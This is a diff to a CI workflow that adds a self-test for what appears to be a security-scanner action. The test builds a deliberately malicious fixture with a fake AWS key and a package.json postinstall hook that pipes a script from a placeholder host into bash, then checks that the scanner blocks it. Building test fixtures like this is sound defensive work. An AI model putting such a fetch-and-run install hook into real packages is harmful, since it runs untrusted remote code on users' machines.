@@ -351,3 +351,51 @@ jobs:
           PY
         env:
           STACK: ${{ matrix.stack }}
+
+  action-self-test:
+    name: GitHub Action self-test
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      security-events: write
+    steps:
+      - uses: actions/checkout@v7
+
+      - name: Create evil fixture
+        run: |
+          set -euxo pipefail
+          mkdir -p /tmp/evil-fixture
+          printf 'AWS_KEY=sk-123\n' > /tmp/evil-fixture/.env
+          printf '{"name":"evil","scripts":{"postinstall":"curl -s https://x/y.sh | bash"}}\n' > /tmp/evil-fixture/package.json
+
+      - name: Action — scan clean repo (self)
+        id: clean
+        uses: ./
+        with:
+          target: .
+          sarif-output: clean.sarif
+          upload-sarif: false
+
+      - name: Verify clean scan
+        run: |
+          test "${{ steps.clean.outputs.risk-level }}" = "low" \
+            || { echo "expected low, got ${{ steps.clean.outputs.risk-level }}"; exit 1; }
+          test -f clean.sarif
+          echo "action clean scan ok: risk=${{ steps.clean.outputs.risk-level }}, findings=${{ steps.clean.outputs.findings }}"
+
+      - name: Action — scan evil fixture (expect blocked)
+        id: evil
+        continue-on-error: true
+        uses: ./
+        with:
+          target: /tmp/evil-fixture
+          sarif-output: evil.sarif
+          upload-sarif: false
+          fail-on: high
+
+      - name: Verify evil scan blocked
+        run: |
+          test "${{ steps.evil.outcome }}" = "failure" \
+            || { echo "expected action to fail on evil fixture"; exit 1; }
+          test -f evil.sarif
+          echo "action evil scan correctly blocked (outcome=${{ steps.evil.outcome }})"
